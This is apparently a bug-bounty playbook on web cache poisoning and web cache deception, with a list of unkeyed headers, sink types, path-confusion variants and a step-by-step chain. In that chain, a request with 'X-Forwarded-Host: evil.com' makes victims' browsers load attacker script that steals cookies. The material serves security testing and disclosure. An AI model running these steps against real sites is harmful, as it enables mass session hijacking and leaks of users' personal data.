# Cache Poisoning + Web Cache Deception — $18K PayPal pattern

> H1: PayPal stored XSS via cache poisoning $18,900. Cache attacks pay because they affect every cache hit — mass impact.

---

## CONCEPT 1 — Cache poisoning

Caches key requests by `Host + path + query`. If the *response* depends on something **not** in the key (an *unkeyed input*: header, cookie, or specific query param), an attacker can submit a request whose response includes attacker-controlled content and gets cached for **all** subsequent users hitting that key.

---

## STAGE 1 — Detect cache

Look for: `X-Cache: HIT/MISS`, `Age: N`, `Cache-Control`, `Via:` headers. Also CDN signals: `cf-cache-status`, `x-amz-cf-id`, `x-served-by` (Fastly), `x-akamai-...`.

---

## STAGE 2 — Find unkeyed inputs

Use **Param Miner** (Burp ext, James Kettle). It probes thousands of headers/params, watches for changes in cached response.

Common unkeyed inputs:
- `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Server`, `X-Forwarded-Port`
- `X-Original-URL`, `X-Rewrite-URL`, `X-Override-URL`
- `X-Host`, `X-Forwarded-For`
- `X-HTTP-Method-Override`
- `True-Client-IP`
- Custom: `X-Wap-Profile`, `X-Acuna-User-Agent`, `X-Akamai-...`
- Request body cookies / hidden cookie values

---

## STAGE 3 — Find a sink

The unkeyed input must reach a reflected location:
- HTML body (Open Graph URLs, "you searched for X", error message)
- HTTP response header (`Location:` redirect, `Link:` preload)
- JS variable in inline `<script>`
- JSON response field used in client-side rendering

The PayPal $18.9K case: `X-Forwarded-Host` was reflected in a JS variable on the signin page; cache keyed only path -> attacker poisons cache, every user hitting `/signin` got attacker JS.

---

## STAGE 4 — Cache key analysis

Cache key may include some headers but not others. Test by varying:
- `User-Agent` (sometimes keyed)
- `Cookie` (sometimes keyed but only specific cookies)
- `Accept-Encoding` (sometimes keyed)
- The request method itself

Tool: **kettle/cache-poisoning-collab** workflows.

---

## STAGE 5 — Fat GET / Smuggling-as-poisoning

If front-end smuggle is possible (see `request-smuggling.md`), use it to inject responses into the cache. Slack used this pattern.

```
POST / HTTP/1.1
...
Smuggled GET /static/x.js with attacker JS as response
```

---

## CONCEPT 2 — Web Cache Deception

User visits `target.com/account.php/non-existent.css`:
- Backend: serves `account.php` with user's PII (ignores trailing `.css`)
- Cache: sees `.css`, caches the response (because static)
- Attacker: visits same URL -> reads cached response containing victim's PII

### Detection
For any authenticated page, append `/non-existent.css`, `/x.jpg`, `/x.png`, `/x.js`. If response 200 with sensitive content + `X-Cache: HIT` after a victim visit -> deception.

Variants:
- `/account/profile;.css`
- `/account/profile%2F.css`  
- `/account/profile/.../x.css`
- `/account/profile?x=y.css`

PortSwigger has a great taxonomy.

---

## STAGE 6 — Impact escalation

### Cache poisoning impacts
- **Stored XSS for all users hitting cache key** -> mass session hijack
- **Open redirect cached** -> phish all users
- **Forced JS load from attacker domain** -> mass MITM
- **Denial of cache**: poison with very-high TTL trash content -> DoS

### Web cache deception impacts
- **PII leak** (emails, names, billing info)
- **API token / CSRF token leak** in HTML page
- **Session cookie reflection** in error pages

---

## CHAIN RECIPE — Cache poisoning -> stored XSS -> ATO

1. Identify CDN cache and `X-Forwarded-Host` reflection in JS
2. Send poisoning request:
   ```
   GET /signin HTTP/1.1
   X-Forwarded-Host: evil.com
   ```
3. Response references `evil.com/static/main.js` and is cached
4. Victims hit `/signin`, browser fetches `evil.com/static/main.js` -> attacker JS runs
5. JS reads cookies, exfils -> ATO

---

## VALIDATION CHECKLIST

- Confirm cache hit for normal path before poisoning
- Use a unique attacker-controlled value to prove poisoning
- Test impact in private browsing -> normal user view
- Document TTL / cache scope
- Report immediately and (if program permits) push the de-cache request to clear

---

## TOOLING

- **Param Miner** (Burp ext) — autodetects unkeyed
- **HTTP Request Smuggler** for fat-GET smuggling
- nuclei templates `tags=cache`
- Manual: just header fuzzing with curl + watch X-Cache
